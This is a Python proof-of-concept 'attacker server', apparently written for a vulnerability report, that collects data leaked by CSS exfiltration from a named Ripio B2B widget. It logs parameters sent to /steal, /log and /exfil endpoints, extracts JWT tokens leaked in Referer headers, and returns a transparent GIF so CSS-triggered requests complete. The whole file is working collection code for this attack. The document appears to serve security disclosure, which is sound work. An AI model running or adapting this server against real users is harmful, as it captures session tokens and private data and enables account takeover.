#!/usr/bin/env python3
"""
Attacker server to demonstrate CSS exfiltration from Ripio B2B Widget
This server logs all incoming requests, simulating token/data theft
"""

from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse
import datetime

class AttackerHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        pass  # Suppress default logging
    
    def do_GET(self):
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Parse the request
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        # Log stolen data
        if '/steal' in self.path or '/log' in self.path or '/exfil' in self.path:
            print(f"\n{'='*60}")
            print(f"[{timestamp}] 🔴 DATA EXFILTRATED!")
            print(f"{'='*60}")
            print(f"Path: {self.path}")
            print(f"Referer: {self.headers.get('Referer', 'None')}")
            print(f"User-Agent: {self.headers.get('User-Agent', 'None')}")
            
            if params:
                print(f"\nStolen Parameters:")
                for key, value in params.items():
                    print(f"  {key}: {value}")
            
            # Check for JWT in referer (token leakage)
            referer = self.headers.get('Referer', '')
            if '_to=' in referer:
                token_start = referer.find('_to=') + 4
                token_end = referer.find('&', token_start)
                if token_end == -1:
                    token_end = len(referer)
                token = referer[token_start:token_end]
                print(f"\n🔑 JWT TOKEN LEAKED VIA REFERER:")
                print(f"  {token[:50]}..." if len(token) > 50 else f"  {token}")
            
            print(f"{'='*60}\n")
            
            # Return 1x1 transparent GIF (for CSS background-image requests)
            self.send_response(200)
            self.send_header('Content-Type', 'image/gif')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            # 1x1 transparent GIF
            self.wfile.write(b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;')
        else:
            # Serve local files
            super().do_GET()
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', '*')
        self.end_headers()

if __name__ == '__main__':
    port = 8888
    server = HTTPServer(('0.0.0.0', port), AttackerHandler)
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   ATTACKER SERVER - CSS Exfiltration Demo                ║
║   Listening on http://localhost:{port}                      ║
╠══════════════════════════════════════════════════════════╣
║   Test URLs:                                             ║
║   /steal?token=XXX  - Simulate token theft               ║
║   /log?char=X       - Simulate CSS char exfil            ║
║   /exfil?data=XXX   - Generic data exfiltration          ║
╚══════════════════════════════════════════════════════════╝
Waiting for stolen data...
""")
    server.serve_forever()
